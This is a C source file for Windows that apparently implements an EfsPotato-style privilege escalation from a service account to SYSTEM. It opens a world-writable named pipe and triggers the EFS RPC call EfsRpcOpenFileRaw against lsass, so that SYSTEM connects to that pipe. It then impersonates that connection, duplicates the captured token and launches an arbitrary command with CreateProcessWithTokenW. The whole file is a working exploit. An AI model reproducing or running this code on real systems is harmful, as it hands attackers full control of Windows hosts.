#include "service2system.h"


extern LPWSTR g_pwszCommandLine;
extern HANDLE hSystemToken;


void GetSystemAsImpersonatedUser(HANDLE hToken)
{
	DWORD dwCreationFlags = 0;
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	LPWSTR pwszCurrentDirectory = NULL;
	
	LPVOID lpEnvironment = NULL;
	HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
	
	// WCHAR cmd[] = L"C:\\Windows\\System32\\cmd.exe";
	HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;
	

	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
	{
		wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}

	wprintf(L"[+]DuplicateTokenEx() OK\n");

	dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
	dwCreationFlags |= CREATE_NEW_CONSOLE;


	ZeroMemory(&si, sizeof(STARTUPINFO));
	
	
	si.cb = sizeof(STARTUPINFO);
	si.lpDesktop = (LPWSTR)L"WinSta0\\default";
	
	if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, g_pwszCommandLine, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
	{
		wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}
	else
	{
		wprintf(L"[+] CreateProcessWithTokenW() OK\n");
		return;
	}



cleanup:
	if (hToken)
		CloseHandle(hToken);
	if (hSystemTokenDup)
		CloseHandle(hSystemTokenDup);
	if (pi.hProcess)
		CloseHandle(pi.hProcess);
	if (pi.hThread)
		CloseHandle(pi.hThread);
	return;
}

void StartNamedPipeAndGetSystem()
{
	printf("start StartNamedPipeAndGetSystem\n");
	HANDLE hPipe = INVALID_HANDLE_VALUE;
	LPWSTR pwszPipeName;
	SECURITY_DESCRIPTOR sd = { 0 };
	SECURITY_ATTRIBUTES sa = { 0 };
	DWORD buffer_size = 0;
	HANDLE hToken = INVALID_HANDLE_VALUE;

	pwszPipeName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
	StringCchPrintf(pwszPipeName, MAX_PATH, L"\\\\.\\pipe\\random\\pipe\\srvsvc");

	if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
	{
		wprintf(L"InitializeSecurityDescriptor() failed. Error: %d - ", GetLastError());
		LocalFree(pwszPipeName);
		return;
	}
	if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;WD)", 1, &((&sa)->lpSecurityDescriptor), NULL))
	{
		wprintf(L"ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d\n", GetLastError());
		LocalFree(pwszPipeName);
		return;
	}
	if ((hPipe = CreateNamedPipe(pwszPipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa)) != INVALID_HANDLE_VALUE)
	{
		wprintf(L"[*] Named pipe '%ls' listening...\n", pwszPipeName);
		
		if (ConnectNamedPipe(hPipe, NULL) > 0) {
			wprintf(L"[+] A client connected!\n");
			if (ImpersonateNamedPipeClient(hPipe)) {
				WCHAR szUser[256];
				DWORD dwSize = 265;
				GetUserName(szUser, &dwSize);
				wprintf(L"[+] Impersonating dummy :) : %s\n\n\n\n", szUser);

				if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken)) {
					CloseHandle(hPipe);
				}
			}
			else {
				wprintf(L"[-] CreateNamedPipe error\n");
				CloseHandle(hPipe);
				return;
			}
		}
		return;
	}
}

void ExecuteCommand(PWCHAR Command)
{
	RPC_STATUS status;
	RPC_WSTR pszStringBinding;
	RPC_BINDING_HANDLE BindingHandle;

	g_pwszCommandLine = Command;

	status = RpcStringBindingCompose(
		NULL,
		(RPC_WSTR)L"ncacn_np",
		(RPC_WSTR)L"\\\\127.0.0.1",
		(RPC_WSTR)L"\\pipe\\lsass",
		NULL,
		&pszStringBinding
	);
	wprintf(L"[+]RpcStringBindingCompose status: %d\n", status);


	status = RpcBindingFromStringBinding(pszStringBinding, &BindingHandle);
	wprintf(L"[+]RpcBindingFromStringBinding status: %d\n", status);


	status = RpcStringFree(&pszStringBinding);
	wprintf(L"[+] RpcStringFree code:%d\n", status);
	RpcTryExcept{
		PVOID pContent;
		LPWSTR pwszFileName;
		pwszFileName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
		StringCchPrintf(pwszFileName, MAX_PATH, L"\\\\127.0.0.1/pipe/random\\C$\\x");

		long result;
		wprintf(L"[*] Invoking EfsRpcOpenFileRaw with target path: %ws\r\n", pwszFileName);
		result = EfsRpcOpenFileRaw(
			BindingHandle,
			&pContent,
			pwszFileName,
			0
		);
		// wprintf(L"[*] Error: %ld\r\n", result);
		status = RpcBindingFree(
			&BindingHandle                   // Reference to the opened binding handle
		);
		LocalFree(pwszFileName);
	}
		RpcExcept(1)
	{
		wprintf(L"RpcExcetionCode: %d\n", RpcExceptionCode());
	}RpcEndExcept
	Sleep(1000);
	GetSystemAsImpersonatedUser(hSystemToken);
}


void Service2System() {
	DWORD dwThread = 0;
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)StartNamedPipeAndGetSystem, NULL, NULL, &dwThread);
	Sleep(1000);
}